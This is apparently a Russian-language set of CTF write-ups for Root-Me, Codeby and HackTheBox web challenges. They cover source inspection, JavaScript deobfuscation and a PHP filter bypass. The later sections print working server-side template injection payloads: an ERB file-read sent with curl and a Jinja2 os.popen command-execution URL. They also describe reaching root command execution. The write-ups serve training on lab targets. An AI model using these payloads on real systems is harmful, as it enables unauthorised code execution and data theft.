# Noob: Sanity


## HTML - Source code

**Платформа:** https://www.root-me.org/
**Уровень:** Very easy

Первое задание называется HTML. По названию можно понять, на что нужно будет обратить внимание. Ссылка на условие задания: https://www.root-me.org/en/Challenges/Web-Server/HTML

![[Pasted image 20230107154650.png]]

Нажимаем кнопку "Start the challenge" и попадаем на сайт.

![[Pasted image 20230107154714.png]]

Сразу откроем исходный код и просмотрим его.

![[Pasted image 20230107154747.png]]

Ничего интересного, но если мы двинем ползунок влево, то увидим следующий закомментированный текст. В нём и будет наш пароль.

![[Pasted image 20230107154833.png]]

Обычно такие задания стоят одними из первых на различных не сложных соревнованиях, и их стоимость одна из самых минимальных. Данное задание обращает внимание на то, что иногда в комментариях к коду можно найти что-нибудь интересное, т.к. комментарии оставляют разработчики.

---

## HTTP directory indexing

**Платформа:** https://www.root-me.org/
**Уровень:** Very easy

Решим ещё одно задание. Название - "HTTP directory indexing". Судя по названию, задание нацелено на индексацию директорий на веб-сервере. Прямая ссылка на задание - https://www.root-me.org/en/Challenges/Web-Server/HTTP-directory-indexing

Приступаем к заданию и попадаем на следующее веб-приложение.

![[Pasted image 20230107162007.png]]

Никаких видимых подсказок нет, по этому посмотрим исходный код.

![[Pasted image 20230107162033.png]]

В исходном коде видим, что подключается некоторый файл из локальной папки admin. Так как в названии задание сказано про индексацию, попробуем просто зайти в папку admin.

![[Pasted image 20230107162105.png]]

Отлично, она индексируется (мы видим её содержимое). В данной папке находится файл (который и подключается к предыдущей страничке) и папку. Зайдём в папку и посмотрим её содержимое.

![[Pasted image 20230107162131.png]]

Видим некоторый текстовый файл "admin.txt". Попробуем открыть его.

![[Pasted image 20230107162200.png]]

Получаем пароль.

Данное задание акцентирует внимание на таком свойстве, как индексация. Смысл индексации заключается в том, что перед вам предстаёт по сути папка с файлами и другими папками и всё это находится на сервере. Не редкость, когда про индексацию забывают в важных местах веб-приложения, и таким образом любой желающий может получить доступ к конфиденциальным файлам или исходным кодам.

---
## HTML - disabled buttons

**Платформа:** https://www.root-me.org/
**Уровень:** Very easy

Переходя на страницу мы видим форму, где не можем ничего отправить:

![[Pasted image 20240504192540.png]]

На странице видим заблокированную форму. Нам нужно ее разблокировать и использовать. Для этого откроем панель разработчика.

![[Pasted image 20240504192608.png]]

![[Pasted image 20240508153951.png]]

Наблюдаем два элемента формы, у которых присутствует параметр disabled. Нужно его просто удалить. **Вы можете видеть, что оба входных тега отключены.** Просто редактируем исходник, тогда у нас будет возможность отправки данных, тем самым получаем ключ:

![[Pasted image 20240504192743.png]]

Теперь вы можете видеть, что мы успешно включили кнопку и тег ввода.

![[Pasted image 20240504192808.png]]

Введите что-нибудь в качестве входных данных и нажмите кнопку "Member Access Button"

Теперь отправляем какой нибудь текст в форме и получаем флаг.

![[Pasted image 20240504192852.png]]

Бинго!

---
## Install ﬁles

**Платформа:** https://www.root-me.org/
**Уровень:** Very easy

Исходя из названия скорей всего речь пойдёт про установочные файлы, которые могут оставаться на веб-сервере, после установки администратором какой-либо популярной CMS системы. Посмотрим описание.

![[Pasted image 20230108205410.png]]

Видим, что в описании нам намекают на phpBB, погуглим, чтобы понять, что это такое.

![[Pasted image 20230108205428.png]]

Судя по всему это какой-то софт для организации форумов или что-то в этом роде. 

Зайдём на сайт по заданию.

![[Pasted image 20230108205448.png]]

Перед нами пустота. В исходниках есть подсказка.

![[Pasted image 20230108205507.png]]

Перейдём по этой ссылке.

![[Pasted image 20230108205526.png]]

Лучше не стало. Попробуем перейти в директорию install (задача ведь на это указывала).

![[Pasted image 20230108205550.png]]

Видим, что директория индексируется. Посмотрим на скрипт.

![[Pasted image 20230108205609.png]]

Всё на французском ... но вроде бы есть пароль, попробуем его сдать.

![[Pasted image 20230108205623.png]]

---
## Javascript - Authentication

**Платформа:** https://www.root-me.org/
**Уровень:** Very easy

При переходе на сайт нам показывают форму для логин и пароля

![[Pasted image 20240504194949.png]]

Нам кинули подсказку в названии задачи. Cмотрим на исходник и находим что-то интересное:

```html
<html>  
<head>  
   <script type="text/javascript" src="login.js"></script>  
</head>  
<body><link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /><iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe>  
    <fieldset style="margin-top: 10px; padding: 10px;" width="60%">  
    <legend><b>Login</b></legend><br/>  
    <form name="login" method="POST" action="">  
        Username : <input name="pseudo" /><br/>  
        Password : <input type="password" name="password" /></br></br>  
        <input onclick="Login()" type="button" value="login" name="button" />  
    </form>  
    </fieldset>  
</body>  
</html>
```

Обращаем внимание на строку:

```js
   <script type="text/javascript" src="login.js"></script>  
```

Выходить у нас есть JS-код который проверяет логин и пароль. Есть разные способы чтобы взглянуть на подключенный JS:

1. Указать путь к js-файлу через URL;
2. Использование инструменты разработчика в браузера;
3. Использование различных других инструментов для пентеста - такие как burp или zap (они так же показывают структуру сайта что делает анализ очень удобным);

Давайте уже взгляним на js-код:

```js
/* <![CDATA[ */

function Login(){
	var pseudo=document.login.pseudo.value;
	var username=pseudo.toLowerCase();
	var password=document.login.password.value;
	password=password.toLowerCase();
	if (pseudo=="4dm1n" && password=="sh.org") {
	    alert("Password accepté, vous pouvez valider le challenge avec ce mot de passe.\nYou an validate the challenge using this password.");
	} else { 
	    alert("Mauvais mot de passe / wrong password"); 
	}
}
/* ]]> */ 

```

Тут всё очень просто, если у нас имя юзера "4dm1n" и пароль "sh.org" то получаем сообщение о том что пароль принять. Вот так мы и решили эту задачу.

Еще мы можем с п.м. тега `<hidden>` решить эту задачу. Открываем исходный код в браузере и в форме login в поле **Username** и **Password** меняем тип поля с п.м. атрибута **type** на **hidden** и даём значение  **4dm1n**  для **Username** и **sh.org** для **Password** c п.м. атрибута **value**.  Сохраняем и после нажимаем на кнопку отправки и получаем сообщение о том что пароль принять.

>**Примечение:** Для анализа вы можете использовать инструменты разработчика в браузере, но я лично рекоминдую использовать **Burp** или **Zap** для аналих кода и поиска уязвимости.


---

## Javascript - Authentication 2

**Платформа:** https://www.root-me.org/
**Уровень:** Very easy

Переходим по ссылке 

![[Pasted image 20240506005454.png]]

При нажатии конпки **login** появляется окно ввода имя пользователя и пароля. Не надо быть гением чтобы понять что окно запускается с п.м. JS-кода. Для удобства мы можем сканировать сайт с п.м. **zap** или перехватить запрос с помощью **burp** для анализа. Выбираем удобный для нас способ анализа.

Какой бы способ вы не выбрали, итак-итак мы проверяем исходник:

```html
<html>
    <head>
	<title>JS Authentication</title>
	<script language="JavaScript" src="login.js"></script>
    </head>
   <body><link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /><iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe>
	<div id=EchoTopic>
	<p>Authentication</p>
	<p><input type="button" value="login" onclick="connexion();"></p>
	<br/><br/>
	<a href="javascript:window.close();">Close Window</a>
	</div>
    </body>
</html>
```

Можно заметить что подключен js-файл который называется **login.js**, и на странице при нажатии кнопки **login** выполняется функция **connexion()**. Эта функция как можно понять находится в **login.js**. Есть разные способы чтобы взглянуть на подключенный JS:

1. Указать путь к js-файлу через URL;
2. Использование инструменты разработчика в браузера;
3. Использование различных других инструментов для пентеста - такие как burp или zap (они так же показывают структуру сайта что делает анализ очень удобным);

Давайте уже взгляним на js-код:

```js
function connexion(){
    var username = prompt("Username :", "");
    var password = prompt("Password :", "");
    var TheLists = ["GOD:HIDDEN"];
    for (i = 0; i < TheLists.length; i++)
    {
        if (TheLists[i].indexOf(username) == 0)
        {
            var TheSplit = TheLists[i].split(":");
            var TheUsername = TheSplit[0];
            var ThePassword = TheSplit[1];
            if (username == TheUsername && password == ThePassword)
            {
                alert("Vous pouvez utiliser ce mot de passe pour valider ce challenge (en majuscules) / You can use this password to validate this challenge (uppercase)");
            }
        }
        else
        {
            alert("Nope, you're a naughty hacker.")
        }
    }
}
```

Этот код запрашивает у пользователя имя пользователя и пароль, затем проверяет их с помощью массива TheLists. Если имя пользователя и пароль совпадают с определенным значением в массиве, он выдает предупреждение об успешном вводе пароля. Если нет, то выводится предупреждение о том, что пользователь является "непослушным хакером".

Код довольно простой да и мы получили флаг;)

---

## Javascript - Obfuscation 1

**Платформа:** https://www.root-me.org/
**Уровень:** Very easy


При переходе на страницу запускается js-код который просить на ввести пароль. Перехватим запрос и посмотрим что из себя представляет страница:

![[Screenshot_20240508_150909.png]]

```html

<html>
    <head>
        <title>Obfuscation JS</title>

          <script type="text/javascript">
              /* <![CDATA[ */

              pass = '%63%70%61%73%62%69%65%6e%64%75%72%70%61%73%73%77%6f%72%64';
              h = window.prompt('Entrez le mot de passe / Enter password');
              if(h == unescape(pass)) {
                  alert('Password accepté, vous pouvez valider le challenge avec ce mot de passe.\nYou an validate the challenge using this pass.');
              } else {
                  alert('Mauvais mot de passe / wrong password');
              }

              /* ]]> */
          </script>
    </head>
   <body><link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /><iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe>
    </body>
</html>
```

Всё очень просто, у нас есть переменная **pass** значение который закодирован. Мы у пользователя спрашиваем пароль значение которого сохраняем в переменной **h**, после значение переменной **h** сравнивается со значением переменной **pass** который декодируется с п.м. функции **unescape()**, подробную информацию про функцию **unescape()** можно найти в интернете. 

Так есть много разных способов решение:

1. Открыть в браузере инструменты разработчика и там запустить js код (неудобно);
2. Созадть свою страницу с js-кодом где декодируешь строку (тоже неудобно);
3. Установить nodejs и сразу сопустить код в терминале (хорошая идея);
4. Онлайн url-декодеры (самое быстрое решение);

```
Вид кодирования URL называется URL-кодирование или процентное кодирование. Он использует специальные символы для замены недопустимых символов в URL, таких как пробелы или специальные символы. Каждый недопустимый символ заменяется символом "%" и его двумя шестнадцатеричными цифрами. Например, символ пробела заменяется на "%20". Это позволяет передавать ссылки и данные через URL без ошибок.

URL-кодирование используется для преобразования специальных символов в URL-ссылке в безопасную и понятную для компьютера форму. Это делается для того, чтобы избежать конфликтов синтаксиса и ошибок при передаче данных через интернет. URL-кодирование позволяет передавать символы, которые могут быть интерпретированы неправильно браузером или сервером, в виде безопасных последовательностей символов, которые будут правильно распознаны и обработаны.

URL-кодирование часто используется в веб-разработке для передачи данных между клиентом и сервером с помощью параметров URL, таких как веб-формы и адреса API. Во многих языках программирования есть встроенные функции для URL-кодирования и URL-декодирования данных.
```

---

## Javascript - Obfuscation 2

**Платформа:** https://www.root-me.org/
**Уровень:** Very easy

Сразу перехватываем запрос и смотрим на исходник:

```html
<html>

<head>
	<title>Obfuscation JS</title>
<!-- 
Obfuscation 
.Niveau : Facile 
.By Hel0ck
.The mission : 
	Retrouver le password contenu dans la var pass.
	You need my help ? IRC : irc.root-me.org #root-me
-->
<script type="text/javascript">
	var pass = unescape("unescape%28%22String.fromCharCode%2528104%252C68%252C117%252C102%252C106%252C100%252C107%252C105%252C49%252C53%252C54%2529%22%29");
</script>
</head>

</html>
```

Открываем терминал и запускаем nodeJS командой **node**:

```
Welcome to Node.js v20.12.2.  
Type ".help" for more information.  
> unescape("String.fromCharCode(104,68,117,102,106,100,107,105,49,53,54)")  
'String.fromCharCode(104,68,117,102,106,100,107,105,49,53,54)'  
> String.fromCharCode(104,68,117,102,106,100,107,105,49,53,54)  
'hDufjdki156'  
>
```

Решение с п.м. инструменты разработчика в браузере:

![[Pasted image 20240508153006.png]]

---

## Javascript - Obfuscation 3

Как только страница откроется, появится интерактивное окно с запросом пароля. Введите пароль `FAUX PASSWORD HAHA`.

Откройте инструменты разработчика браузера, переключитесь на Сеть и найдите `ch13.html`фрагмент js-кода с именем. Хооотяя леге захватить запрос с **Burp** или использовать **ZAP**.

Я нашел в коде функцию, которая используется для определения ввода `dechiffre`, но после небольшого анализа я выяснил, что функция этой функции заключается в возврате независимо от того, что введено `FAUX PASSWORD HAHA`(первая строка `var pass = "70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65";`— это просто десятичный ASCII-код этого строка подсказок, используемая для того, чтобы сбить с толку аудиторию).

Глядя на исходный код, скрипт кажется подозрительным. Читая код, мы видим, что что бы мы ни вводили, мы все равно получаем «FAUX PASSWORD HAHA». Так где же пароль? Просматривая его снова и снова, я нашел самую подозрительную шестнадцатеричную строку. 

Ключом является строка кода после этой функции:

```js
String["fromCharCode"](dechiffre("\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30"));
```

Эта строка кода не имеет никакого отношения к контексту, но дает подсказку: `fromCharCode`она означает декодирование ASCII, за которым следует ряд `\x` шестнадцатеричных чисел.

![[Pasted image 20240512121013.png]]

Сначала вручную `\x`замените все пробелами, откройте Burp Suite -> Decoder и выполните шестнадцатеричное декодирование ASCII.

**После декодирования вы получаете строку псевдодесятичных чисел,** смешанную с множеством пробелов и запятых :

`55, 56, 54, 79, 115, 69, 114, 116, 107, 49, 50`

![[Pasted image 20240512121157.png]]

Разберитесь вручную и получите настоящую десятичную кодировку ASCII: `55 56 54 79 115 69 114 116 107 49 50`.  
Поскольку Burp Suite **не поддерживает** прямое декодирование **десятичного ASCII** , он сначала кодируется в шестнадцатеричный, затем декодируется в шестнадцатеричный ASCII и, наконец, получается `7 8 6 O s E r t k 1 2`.

Удалите пробелы и объедините их, чтобы получить настоящий пароль, выполнив задание.

![[Pasted image 20240512121231.png]]

**Решение с п.м. Python**

```python
a = "\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30"  
decode = ""  
split = a.split(",")  
print(split)  
for i in split:  
   print(i)  
for i in a.split(','):  
   decode += chr(int(i))  
print(decode)
```

Можно написать крд в более компактном виде:

```python
a = "\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30"  
print("".join( chr(int(i)) for i in a.split(',')))
```
  

---
## Javascript - Native code

**Платформа:** https://www.root-me.org/
**Уровень:** Very easy

Открываем страницу. Нас снова встречает окошко ввода пароля.

![[Pasted image 20240508192418.png]]

Открываем файл и видим native code javascript.

![[Pasted image 20240508192428.png]]

В js есть два универсальных метода: **toString()** и **toSource()**, применимые к объектам. В самом конце кода наблюдаем “()”, то есть им предшествует функция. В консоле стираем “()” и дописываем “**.toSource()**”.

![[Pasted image 20240508192503.png]]

![[Pasted image 20240508192516.png]]

Получили функцию проверки пароля, где можем видеть и сам пароль.

---
## [[Flag Box]]

**Платформа:** https://codeby.games/
**Уровень:** Easy

**Описание задания**: В коробке есть подарок, но получить его, видимо, будет непросто

Вот что мы видим, когда заходим на сайт.

![[Pasted image 20240515133100.png]]

Если ввести “hacker”, то получим ответ “Something went wrong”. Почему так происходит? Давайте разберемся. Скачаем зипку, данную в задании и откроем код.

![[Pasted image 20240515133123.png]]

Вот так выглядит код полностью:

![[Pasted image 20240515133914.png]]

**Разбор кода:**

**1. Инициализация и регенерация сеанса**

Эта функция запускает сессию. Код начинается с запуска сеанса PHP с использованием этой `session_start()`функции. Эта функция создает сеанс или возобновляет существующий:

```php
session_start();
```

После этого он проверяет, задан ли уже идентификатор сеанса `($_SESSION['PHPSESSID'])`. Если нет, он восстанавливает идентификатор сеанса, используя session_regenerate_id(true). Эта функция повышает безопасность за счет создания нового криптографически защищенного идентификатора сеанса. Затем восстановленный идентификатор сеанса сохраняется в переменной `$_SESSION['PHPSESSID']`.

Простыми словами, cледующая функция проверяет наличие сессии. Если сессии нет, то генерируется новый идентификатор и записывается в `PHPSESSID`, заменяя старый:

```php
if (!isset($_SESSION['PHPSESSID'])) {
 
	session_regenerate_id(true);
	$_SESSION['PHPSESSID'] = session_id();
}
```

Затем код выполняет еще одну проверку, чтобы убедиться, что идентификатор сеанса, хранящийся в переменной сеанса ( `$_SESSION['PHPSESSID']`), соответствует идентификатору текущего сеанса ( `session_id()`). Если они отличаются, он снова создает идентификатор сеанса и обновляет переменную сеанса. Такая двойная проверка помогает снизить потенциальные попытки перехвата сеанса. ПРостыми словами, данная функция проверяет, чтобы PHPSESSID не был изменен вручную. Если сессия не совпадает с той, которая указана в коде, генерируется новая:

```php
if ($_SESSION['PHPSESSID'] !== session_id()) {
 
	session_regenerate_id(true);
	$_SESSION['PHPSESSID'] = session_id();
}
```


**2. Фильтрация слов на основе идентификатора сеанса**

```php
if (isset($_POST['word']) && !empty($_POST['word'])) {
  $p0 = $_POST['word'];
  $e1 = zerofunc001();
  $x2 = (zerofunc002($e1)) ? 2 : 3;
  for ($d3 = 0; $d3 < $x2; $d3++) {
    $p0 = str_replace('hacker', '', $p0);
  }
  $word = $p0;
}
```

Следующая функция получает параметр word через POST и проверяет, что он не пустой.

```php
if (isset($_POST['word']) && !empty($_POST['word']))
```

Затем значение параметра записывается в переменную $p:

```php
$p0=$_POST[base64_decode('d29yZA==')];
```

Далее выполняется функция zerofunc001(), и результат записывается в переменную $e1:

```php
$e1=zerofunc001();
```

После этого переменная $e1 передается в функцию zerofunc002() где происходит проверка условия. Если число четное, результат равен 2. В противном случае результат равен 3:

```php
$x2=(zerofunc002($e1))?2:3;
```

Затем запускается цикл, который продолжается до тех пор, пока переменная $d3 не станет равной числу $x2. Внутри цикла происходит замена всех вхождений строки “hacker” в переменной $p0 на пустую строку, что фактически удаляет эту подстроку из переменной.

```php
for($d3=0;$d3<$x2;$d3++) {
	$p0=str_replace(base64_decode('aGFja2Vy'),'',$p0);
} 
```

Результат цикла записывают в переменную $word

```php
$word = $p0;
```

То есть код проверяет, существует ли запрос POST, содержащий слово ( `'word'`), и не является ли это слово пустым. Если оба условия соблюдены, выполняются следующие шаги:

1. Сохраняет отправленное слово в переменной с именем `$p0`.
2. Вызывает `zerofunc001()`функцию, которая извлекает количество цифр, присутствующих в текущем идентификаторе сеанса. Результат присваивается переменной `$e1`.
3. Вызывает `zerofunc002($e1)`функцию, чтобы определить, является ли количество цифр ( `$e1`) четным. Если оно четное, переменной `$x2`присваивается значение 2; в противном случае устанавливается значение 3.
4. Выполняет цикл определенное количество раз в зависимости от значения `$x2`. Количество итераций определяет, сколько раз слово будет фильтроваться.
    - Внутри цикла `str_replace`функция используется для удаления слова «hacker» из `$p0`переменной.


**3. Вспомогательные функции**

Код включает две вспомогательные функции:

1. zerofunc001():
2. zerofunc002()

**Начнем с разборки zerofunc001()**. 

Вот полный код функции zerofunc001():

```php
function zerofunc001() {
 
	if (session_status() == PHP_SESSION_NONE) {
	session_start();
	}
	
	$sessionId = session_id();
	$pattern = '/[0-9]/';
	preg_match_all($pattern, $sessionId, $matches);
	
	return count($matches[0]);
	
}
```
 
Функция zerofunc001() также проверяет наличие сессии и, если она отсутствует, то запускает новую сессию:

```php
if (session_status() == PHP_SESSION_NONE) {
	session_start();
}
```

Переменная $sessionId содержит идентификатор сессии, а переменная $pattern определяет диапазон символов:

```php
$sessionId = session_id();
$pattern = '/[0-9]/';
```

Дальше с помощью функции preg_match_all() производится поиск всех символов, соответствующих заданному диапазону в переменной $pattern и результат записывают в переменную $matches.

```php
preg_match_all($pattern, $sessionId, $matches);
```

Функция zerofunc001() возвращает количество найденных совпадений:

```php
return count($matches[0]);
```

- `zerofunc001()`: Эта функция извлекает количество цифр в идентификаторе сеанса. Сначала он проверяет, активен ли уже сеанс, используя `session_status()`. Если нет, он запускает сеанс, используя `session_start()`. Затем он получает идентификатор текущего сеанса, используя `session_id()`. Он использует регулярное выражение ( `/[0-9]/`) для сопоставления всех цифр идентификатора сеанса и подсчитывает совпадения, чтобы определить количество цифр.

**Время разобрать функцию  zerofunc002()**. 

Функция `zerofunc002($number)` принимает число и проверяет, делится ли оно без остатка, то есть является ли оно четным. Простыми словами эта функция представляет собой простую проверку четных чисел. Он принимает число в качестве входных данных и возвращает результат, `true`если оно четное (остаток нуля при делении на 2), в противном случае возвращает `false`:

```php
function zerofunc002($number) {	
	return $number % 2 == 0;
}
```


Теперь должно быть понятно, почему вместо флага получаем “Something went wrong”. Когда пишем hacker.

**Обход и получение флага**

Когда пришел момент обхода защиты и получения флага, у меня не было четкого представления, как приступить к этой задаче. К счастью, я обнаружила похожую ситуацию в рамках HackyHolidays CTF, что стало полезным источником в процессе решения.

Итак, приступим. Из кода мы уже знаем, что если ввести просто hacker, то он удаляется. Теперь хочу немного наглядно показать это:

![[Pasted image 20240515133956.png]]

Я доработала код, и теперь он показывает, что происходит в цикле:

![[Pasted image 20240515134005.png]]

Для тех, кто не понял. Код удалил “hacker” и остальные итерации остались пустыми. Нам нужно, чтобы к концу итерации остался один “hacker”.

Теперь попробуем “hackehackerr”.

![[Pasted image 20240515134033.png]]

Как видим “hacker” дошел до 0 итерации. Попробуем теперь “hackehackehackerrr”.

![[Pasted image 20240515134138.png]]

Теперь всё прошло так, как нужно. Все итерации были завершены, и в конце остался именно “hacker”, как мы и ожидали.

Теперь сделаем тоже самое на реальном сайте:

![[Pasted image 20240515134156.png]]

**Источник:** https://blog.taipanbyte.ru/Codeby/Flag-Box-Writeup

---
# [[SSTI (Server Side Template Injection)|SSTI]] 

## Error 404
**Платформа:** https://codeby.games/
**Уровень:** Easy

**Описание задания:** Должно быть всё очень просто…

В названии таска у нас самая настоящая подсказка, которая является отправной точкой для решения задания.

**Решение:**

На первый взгляд кажется, что сайт пустой - нас встречает какой-то html слайдер, ничего интересного.

Но у сайта есть особенность - в определенных ситуациях, когда мы пытаемся найти на сайте что-то, чего там априори нет, нас редиректит на некую страницу “ERROR 404”, которая на самом деле не является HTTP-ответом об ошибке, и, чтобы это проверить, воспользуемся Burp Suite и убедимся, что страница возвращает код 200 вместо положенного 404:

![[Pasted image 20240513092628.png]]

Приглядимся к ответу сервера внимательнее, написанный нами текст отправляется в контекст HTML-шаблона страницы.

![[Pasted image 20240513092721.png]]

По мимо этого замечаем, что сайт поднят на **python/3.9.18**

![[Pasted image 20240513092750.png]]

Учитывая всё это, мы можем предположить, что перед нами _SSTI_ (Server-Side Template Injection), опасность которой заключается в том, что при наличии этой уязвимости мы можем выполнять произвольный код на сервере, и, соответственно, получить доступ к конфиденциальным данным.

Проверим справедливость наших размышлений с помощью простейшего эксплойта:

![[Pasted image 20240513092806.png]]

Мы ввели 7*\7 и получили 49. Это значит, что вводимые нами данные интерпретируются на стороне сервера.

`{{...}}`: Это часть синтаксиса шаблонов, который используется во многих шаблонных системах, таких как Jinja2 в Python, для вставки динамического содержимого. Поэтому создавая полезную нагрузку, мы будем ориентироваться на этот факт.

Чтобы “докрутить” SSTI до OS command injection можем импортировать модуль “os”, который будет взаимодействовать непосредственно с операционной системой сервера:

![[Pasted image 20240513092821.png]]

Или можно найти подходящую полезную нагрузку в сети, из там достаточно много. Команда “id” успешно выполнилась и указала на то, что мы имеем доступ к системе под пользователем root (какая удача). Посмотрим, что находится в домашней директории (обратите внимание на то, что некоторые спецсимволы url-кодируются):

![[Pasted image 20240513093009.png]]

Прочитаем его и получим флаг:

![[Pasted image 20240513093204.png]]


Источник: https://blog.taipanbyte.ru/Codeby/%D0%9E%D1%88%D0%B8%D0%B1%D0%BA%D0%B0-404-Writeup 




---
## Neonify

**Платформа:** https://www.hackthebox.com/
**Уровень:** Easy

Хороший легкий вызов, чтобы начать неделю! Я нашел это забавным и увлекательным, несмотря на то, что он помечен как «очень простой». Хороший пример того, как взять несколько уязвимостей и использовать их в RCE.

**Перечисление**

Прежде чем загружать какие-либо файлы, я хотел бы посмотреть, с чем я работаю. Это просто мое личное предпочтение, но обычно я атакую ​​веб-задачи, но сначала взаимодействую с веб-сайтом; затем просмотрите стек развертывания ( `Dockerfile`, `config`и т. д.) за что-нибудь полезное; наконец просмотрите исходный код. Это было особенно полезно при попытке решить [домашнее животное rcbee](https://drt.sh/posts/htb-petpet-rcbee/) .

**Веб-сайт** 

Ничего слишком сумасшедшего. Кажется, это одностраничное приложение (без ссылок или навигации). Содержит простую форму, которая отправляет POST в `/`с текстом для неонификации. Запуск быстрого теста с помощью _Hello World_ работает, как и ожидалось.

Вероятно, это будет своего рода внедрение шаблона. Однако при вводе _drt.sh_ возвращается сообщение **«Обнаружен вредоносный ввод»** . Похоже, что на бэкенде есть некоторая проверка, и простой `.`ломает его. Может быть не так просто, как я думал изначально.

**Стек развертывания** 

Мне нравится проверять `Dockerfile`и посмотреть, какое еще (если есть) ПО установлено внутри контейнера. Я также считаю важным проверить, какой _файл флага_ искать. Есть шанс, что это может быть `flag`, `flag.txt`, или `flag_XXXX`где `XXXX`представляет собой рандомизированный набор символов.

**Исходный код**

Пришло время погрузиться в код и посмотреть, с чем мы работаем!

дерьмо… оно в рубине.

![[Pasted image 20230218142740.png]]

Я не фанат. Думаю, я должен был понять это с четырьмя гигантскими рубинами передо мной.

![[Pasted image 20230218142822.png]]

Изучив исходный код, я заметил две вещи:

-   Параметр `neon`,  который `POST`ed передается в шаблон (возможна инъекция)
-   Существует проверка регулярного выражения для `neon` это позволяет использовать только буквенно-цифровые символы и пробелы.

Для этого потребуется двусторонний подход. Внедрение шаблона на стороне сервера (SSTI) и обход проверки. Это код, который нужно обойти.

```ruby
post '/' do
  if params[:neon] =~ /^[0-9a-z ]+$/i
    @neon = ERB.new(params[:neon]).result(binding)
  else
    @neon = "Malicious Input Detected"
  end
  erb :'index'
end
```


**Эксплуатация**

В Интернете есть много примеров по SSTI и для ruby ​​в целом. Но перед этим можно пройти, чтобы прочитать `flag.txt`файл, ему необходимо обойти проверку регулярного выражения. После [небольшое исследование](https://docs.guardrails.io/docs/en/vulnerabilities/ruby/insecure_use_of_regular_expressions) , по-видимому, с использованием `^`и `$`внутри регулярных выражений в Ruby - плохая идея (?). Выглядело хорошо для меня, но [что я знаю](https://stackoverflow.com/a/577675) ? Зная, что регулярное выражение можно обойти с помощью новой строки, мы можем начать искать эксплойт для чтения `flag.txt`.

```ruby
<%= File.open('flag.txt').read %> # Read file
```

Достаточно просто, но _он должен быть закодирован в URL_ . Имея это в виду, полная полезная нагрузка будет выглядеть так:

```
neon=a
%3C%25%3D%20File.open%28%27flag.txt%27%29.read%20%25%3E
```

**УВЕДОМЛЕНИЕ** . В полезной нагрузке есть фактический символ новой строки. А `\n`написанного недостаточно для правильного анализа.

Что мне действительно нравится в этом вызове, так это то, что это один из тех эксплойтов, которые можно запускать прямо в браузере. Никаких специальных инструментов не нужно! Хотя я все же предпочитаю использовать `curl`;)

Начнем с этого!

**с помощью `curl`**

```bash
# deliberate newline in console as `\n` fails to parse
curl -d 'neon=a
%3C%25%3D%20File.open%28%27flag.txt%27%29.read%20%25%3E' 127.0.0.1:1337
```

```bash
curl 127.0.0.1:1337 \
  -s -X POST -d 'neon=a
%3C%25%3D%20File.open%28%27flag.txt%27%29.read%20%25%3E' | grep -Eo 'HTB{.*}'
```

```
HTB{f4k3_fl4g_f0r_t3st1ng}
```

Да, это было так просто! Привет 


**через Firefox (или Chrome (или другой браузер)) 

Снимков экрана слишком много, поэтому я буду краток и в виде списка:

-   Откройте инструменты разработчика браузера и просмотрите сетевой стек.
-   Отправьте действительную запись (я использовал `a`)
-   Найди `document` с `POST` запрос.
-   Изменить и отправить повторно
-   Измените тело запроса на полезную нагрузку выше
-   Отправить
-   Открыть в новой вкладке (если применимо).

---

## templated

**Платформа:** https://www.hackthebox.com/
**Уровень:** Easy

![[Pasted image 20230212144924.png]]

С название задачи мы уже понимаем что будем иметь дело с шаблонами. При посещении хоста мы видим flask/jinja2.

![[Pasted image 20230212144943.png]]

Уже ясно что нам нужно эксплуатировать шаблонизатор Python - Flask/Jinja2. Немного поиска в гугле. Поэтому я искал эксплойт.

![[Pasted image 20230212145132.png]]

Проверка на SSTI

![[Pasted image 20230212145148.png]]

Получил статью о SSTI

[https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/](https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/)

![[Pasted image 20230212145204.png]]

```
http://165.22.124.155:31361/%7B%7Brequest.application.globals.builtins.import('os').popen('cat%20flag.txt').read()%7D%7D
```

![[Pasted image 20230212145239.png]]

И мы успешно получили флаг..

**Подробное решение**

Задача, обсуждаемая сегодня, называется «Шаблон» и находится в веб-подразделе в разделе задач платформы. Я считаю, что эта задача также дает отличное представление о том, как может выглядеть тестирование на проникновение веб-приложений.

Как только я начал испытание, мне был представлен URL-адрес, указывающий на док-контейнер, на котором запущено целевое веб-приложение. Посетив URL-адрес, я увидел веб-сайт, как показано ниже:

![[Pasted image 20230212150919.png]]

Поначалу это выглядит не так уж и много, и это почти заставляет вас думать, что на такой простой веб-странице не может быть уязвимости, верно? Но помните, это Hack the Box и всегда есть больше, чем кажется на первый взгляд. Чтобы продвинуться вперед в решении этой задачи, единственная информация, которую нам предоставили, это то, что веб-сайт «гордо работает на Flask/Jinja2». Для тех, кто может не знать, Flask — это фреймворк для создания API и веб-приложений на Python, а Jinja2 — механизм шаблонов, который позволяет вставлять код Python в стандартную веб-страницу. Хотя это может быть полезно для разработчика, мы увидим, что это также может вызвать проблемы с безопасностью, которые могут быть очень опасными. Я также рекомендую провести дополнительное исследование этих технологий, если вам интересно. Мои первоначальные исследования при решении этой проблемы привели меня к [этой статье](https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee) о внедрении шаблонов на стороне сервера (SSTI) с помощью Flask, которая очень помогла в решении этой проблемы.

